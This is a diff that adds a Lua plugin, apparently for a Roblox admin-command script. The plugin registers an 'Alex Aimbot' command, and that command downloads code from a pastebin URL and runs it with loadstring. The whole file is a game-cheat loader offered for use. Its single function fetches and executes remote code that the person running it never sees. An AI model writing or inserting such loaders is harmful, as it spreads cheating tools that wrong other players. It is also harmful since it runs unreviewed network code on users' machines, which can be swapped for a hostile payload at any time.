@@ -1,0 +1,16 @@
+local Plugin = {
+    ["PluginName"] = "Alex Aimbot",
+    ["PluginDescription"] = "Very good aimbot",
+    ["Commands"] = {
+        ["alexaimbot"] = {
+            ["ListName"] = "alexaimbot / aa",
+            ["Description"] = "Open the aimbot, press F1 to open the GUI",
+            ["Aliases"] = {"aa"},
+            ["Function"] = function(args,speaker)
+                loadstring(game:HttpGet(("https://pastebin.com/raw/zftiRKFB"),true))()
+            end
+        }
+    }
+}
+
+return Plugin
